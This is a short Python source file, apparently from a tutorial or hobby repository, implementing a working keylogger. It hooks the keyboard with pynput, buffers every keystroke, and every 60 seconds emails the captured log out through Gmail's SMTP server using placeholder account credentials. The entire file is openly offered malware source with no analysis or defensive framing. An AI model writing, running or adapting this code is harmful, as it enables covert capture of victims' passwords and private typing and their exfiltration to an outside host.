import pynput.keyboard
import threading
import smtplib
class Keylogger:
    def __init__(self,time_interval,email,password):
        self.log=""
        self.time_interval=time_interval
        self.email=email
        self.password=password

    def append_to_log(self,string):
        self.log=self.log+string

    def process(self,key):
        try:
            key=str(key.char)
        except AttributeError:
            if key==key.space:
                key=" "
            else:
                key = " "+ str(key)
        self.append_to_log(key)

    def report(self):
        # print(log)
        self.send_mail(self.email,self.password,self.log)
        self.log=""
        timer=threading.Timer(self.time_interval,self.report)
        timer.start()

    def start(self):
        keyboard_listener=pynput.keyboard.Listener(on_press=self.process)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
    
    def send_mail(self,email,password,message):
        self.server=smtplib.SMTP("smtp.gmail.com",587)
        self.server.starttls()
        self.server.login(email,password)
        self.server.sendmail(email,email,message)
        self.server.quit()

zlogger=Keylogger(60,"youraccount@gmail.com","password")
zlogger.start()
